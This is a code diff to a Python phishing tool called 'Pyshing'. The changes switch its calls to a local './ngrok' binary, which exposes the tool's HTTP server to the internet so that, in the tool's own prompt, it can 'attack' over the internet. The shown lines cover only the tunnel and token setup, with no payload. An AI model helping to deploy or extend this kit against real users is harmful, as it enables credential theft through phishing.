@@ -36,7 +36,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
           httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
           if choice.upper() == 'Y':
             print(BLUE+BOLD+"Initializing ngrok reverse proxy"+ENDC)
-            os.system(f'ngrok http {port} > /dev/null &')
+            os.system(f'./ngrok http {port} > /dev/null &')
             os.system('curl --silent http://localhost:4040/api/tunnels > tunnels.json')
             time.sleep(6)
             tunnel = open('tunnels.json','r')
@@ -152,7 +152,7 @@ class Pyshing():
           choice = input(GREEN+"Do you want use internet to attack? Y/n: [Default n] ")
           if choice.upper() == 'Y':
             print("Searching for ngrok...")
-            proc = subprocess.Popen('ngrok --version', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+            proc = subprocess.Popen('./ngrok --version', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
             proc = proc.stdout.read()
             if not 'ngrok' in proc.decode('utf-8'):
               proc = subprocess.Popen('uname -a', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -173,7 +173,7 @@ class Pyshing():
 
               token = input("\nEnter with your Ngrok API Token here: ")
               os.system('chmod +x ngrok')
-              os.system(f'ngrok authtoken {token}')
+              os.system(f'./ngrok authtoken {token}')
             
             print("[+] OK\nStarting Pyshing through the internet"+ENDC)
             SimpleHTTPRequestHandler.run()
